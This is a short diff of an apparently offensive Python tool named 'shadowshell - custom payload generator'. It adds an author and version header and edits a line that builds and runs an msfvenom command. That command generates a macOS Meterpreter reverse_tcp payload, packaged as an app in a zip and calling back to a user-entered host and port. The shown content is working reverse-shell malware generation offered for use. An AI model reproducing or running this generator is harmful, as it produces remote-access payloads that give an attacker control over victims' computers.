@@ -1,3 +1,11 @@
+"""
+-------------------------------------------------
+# shadowshell - custom payload generator
+-------------------------------------------------
+"""
+__author__ = "z0nd3rl1ng"
+__version__ = "0.1.1"
+
 import os, random
 
 def menu():
@@ -13,7 +21,7 @@ def payloadGenerator(mode):
 	    host = input("─────────╼┤HOST├─> ")
 	    port = input("─────────╼┤PORT├─> ")
 	    print("\n")
-	    command = "sudo msfvenom -p osx/x64/meterpreter/reverse_tcp_uuid LHOST="+host+" LPORT="+port+" -a x86 --platform osx -f osx-app -o shadowpacked.zip"
+	    command = "sudo msfvenom -p osx/x64/meterpreter/reverse_tcp_uuid LHOST="+host+" LPORT="+port+" -a x64 --platform osx -f osx-app -o shadowpacked.zip"
 	    os.system(command)
         
     elif mode == "2":
